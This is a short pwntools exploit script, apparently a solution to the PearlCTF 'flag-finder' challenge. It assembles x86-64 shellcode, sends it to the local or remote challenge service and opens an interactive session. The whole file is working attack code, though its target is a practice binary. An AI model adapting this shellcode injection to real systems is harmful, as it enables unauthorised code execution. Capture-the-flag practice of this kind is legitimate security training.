from pwn import *

exe = ELF("./flag-finder")
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(
        exe.path,
        """
        b *fgets
        continue
    """,
    )
elif args.REMOTE:
    io = remote("dyn.ctf.pearlctf.in", 30012)

code = asm(
    """
pop rdi
pop rdi
pop rdi
mov rdi, rsp
mov r12, 0x401120
call r12
"""
)

# asm("""
# call 0x1120
# """, vma=0x400000)

print(code)
io.sendlineafter(b">", code)
io.interactive()
